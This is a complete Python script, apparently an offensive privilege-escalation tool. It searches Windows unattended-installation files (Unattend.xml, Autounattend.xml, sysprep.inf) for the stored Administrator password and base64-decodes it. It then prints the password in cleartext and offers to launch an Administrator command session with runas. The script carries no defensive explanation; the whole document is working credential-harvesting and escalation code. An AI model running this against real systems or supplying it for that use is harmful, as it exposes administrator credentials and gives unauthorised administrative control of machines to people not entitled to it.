import os
import re
import base64
import subprocess

# Define file paths to check
FILE_PATHS = [
    "C:\\Windows\\Panther\\Unattend.xml",
    "C:\\Windows\\Panther\\Autounattend.xml",
    "C:\\Windows\\System32\\sysprep\\sysprep.inf"
]

# Regular expression to find the administrator password
PASSWORD_PATTERN = re.compile(r"<AdministratorPassword>\s*<Value>(.*?)</Value>", re.IGNORECASE | re.DOTALL)

def extract_password_from_file(file_path):
    """
    Extract administrator password from unattended installation files.
    
    Args:
        file_path (str): Path to the file to check
        
    Returns:
        str or None: Extracted password if found, None otherwise
    """
    try:
        with open(file_path, "r", encoding="utf-8", errors='ignore') as file:
            content = file.read()
            match = PASSWORD_PATTERN.search(content)
            if match:
                password = match.group(1).strip()
                # Remove any XML entities or special characters
                password = clean_password(password)
                return password if password else None
    except Exception as e:
        print(f"[-] Error reading {file_path}: {e}")
    return None

def clean_password(password):
    """
    Clean and normalize the extracted password.
    
    Args:
        password (str): Raw extracted password
        
    Returns:
        str: Cleaned password
    """
    # Remove extra whitespace, newlines, and carriage returns
    password = password.strip()
    # Handle common XML entities
    password = password.replace('&amp;', '&')
    password = password.replace('&lt;', '<')
    password = password.replace('&gt;', '>')
    password = password.replace('&quot;', '"')
    password = password.replace('&apos;', "'")
    return password

def is_valid_base64(string):
    """
    Check if a string is valid Base64.
    
    Args:
        string (str): String to check
        
    Returns:
        bool: True if valid Base64, False otherwise
    """
    try:
        # Check if it's valid base64
        decoded = base64.b64decode(string, validate=True)
        # Try to decode as UTF-8
        decoded.decode('utf-8')
        return True
    except Exception:
        return False

def decode_password(password):
    """
    Decode password if it's Base64 encoded, otherwise return as is.
    
    Args:
        password (str): Password to decode
        
    Returns:
        tuple: (decoded_password, is_base64)
    """
    # Remove any whitespace
    clean_pwd = password.strip()
    
    # Try to decode as Base64
    try:
        # First check if it looks like Base64
        if is_valid_base64(clean_pwd):
            decoded = base64.b64decode(clean_pwd).decode('utf-8', errors='ignore')
            return decoded, True
    except Exception:
        pass
    
    # If we get here, it's not valid Base64
    return password, False

def start_admin_session(password):
    """
    Start an administrative session using the extracted password.
    
    Args:
        password (str): Administrator password
    """
    print("\n[!] Use this password with the following command:")
    print(f"    runas /user:Administrator cmd.exe")
    print(f"    (Enter this password when prompted: {password})")
    
    # Optionally start the admin session automatically
    try:
        response = input("\n[?] Do you want to start an admin session now? (y/n): ").lower()
        if response == 'y':
            print("[*] Starting admin session...")
            command = 'runas /user:Administrator "cmd.exe /K echo Admin session started"'
            subprocess.run(command, shell=True)
    except KeyboardInterrupt:
        print("\n[!] Operation cancelled by user")

def main():
    print("[*] Starting Windows administrator password extraction...")
    print("[*] Checking common unattended installation files\n")
    
    admin_password = None
    found_path = None
    
    for file_path in FILE_PATHS:
        print(f"[-] Checking file: {file_path}")
        
        if not os.path.exists(file_path):
            print("[-] File not found\n")
            continue
        
        print(f"[+] File found: {file_path}")
        admin_password = extract_password_from_file(file_path)
        
        if admin_password:
            print(f"[+] Password extracted successfully from: {file_path}")
            found_path = file_path
            break
        else:
            print("[-] No password found in this file\n")
    
    if not admin_password:
        print("[-] No administrator password found in known file locations.")
        print("[!] Consider checking other system directories or log files.")
        return
    
    # Show the extracted password
    print(f"\n[+] Raw extracted password: {admin_password}")
    
    # Attempt to decode if Base64
    decoded_password, is_base64 = decode_password(admin_password)
    
    if is_base64:
        print(f"[+] Base64 decoded password: {decoded_password}")
        final_password = decoded_password
    else:
        print("[+] Password is in plaintext (not Base64 encoded)")
        final_password = admin_password
    
    # Start admin session
    start_admin_session(final_password)

if __name__ == "__main__":
    main()